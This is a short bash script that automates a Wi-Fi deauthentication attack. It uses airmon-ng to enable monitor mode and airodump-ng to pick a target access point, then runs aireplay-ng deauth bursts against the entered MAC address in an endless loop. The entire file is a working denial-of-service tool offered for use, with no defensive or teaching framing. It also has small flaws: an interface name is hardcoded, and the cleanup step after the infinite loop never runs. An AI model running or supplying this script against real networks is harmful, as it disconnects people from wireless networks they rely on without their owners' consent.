#!/bin/bash
echo "Welcome to the deauth script - MUST BE RUN AS ROOT"
sleep 5
clear

airmon-ng
echo -n "Enter the wireless card to use for the attack: "
read wcard

sleep 5
clear

airmon-ng start $wcard
sleep 5
clear

echo "A window will open shortly showing a list of APs nearby. When you have found the MAC, and channel number you need, close the window."
sleep 5
xterm -e airodump-ng wlan1

clear

echo -n "Enter the MAC address of the target: "
read mac

echo -n "Enter the channel number: "
read chan

echo "In a new termnal, run as root, type: airodump-ng --channel $chan $wcard  then run the command. The attack commences in 60 seconds."
sleep 60

for (( ; ; ))
do
   echo "Press CTRL+C to stop..."
   aireplay-ng -0 100 -a $mac $wcard
   sleep 60
done

airmon-ng stop $wcard
